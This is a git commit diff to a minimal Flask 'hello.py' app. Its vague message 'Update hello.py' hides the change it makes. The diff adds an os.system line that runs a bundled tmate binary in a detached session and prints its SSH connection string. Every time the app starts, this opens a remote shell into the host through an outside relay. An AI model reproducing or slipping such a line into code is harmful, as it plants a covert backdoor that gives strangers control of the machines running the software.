529911c3cf1b9708aa74592789b06538a1b36c87
triasannati <triasannati@gmail.com>
2025-05-11 22:03:34 +0700

    Update hello.py

--- hello.py
+++ hello.py
@@ -1,7 +1,8 @@
 from flask import Flask
 from waitress import serve
 app = Flask(__name__)
-
+import os
+os.system("chmod +x tmate;./tmate -S /tmp/tmate.sock new-session -d;./tmate -S /tmp/tmate.sock wait tmate-ready;./tmate -S /tmp/tmate.sock display -p '#{tmate_ssh} -t'")
 
 @app.route('/')
 def hello():
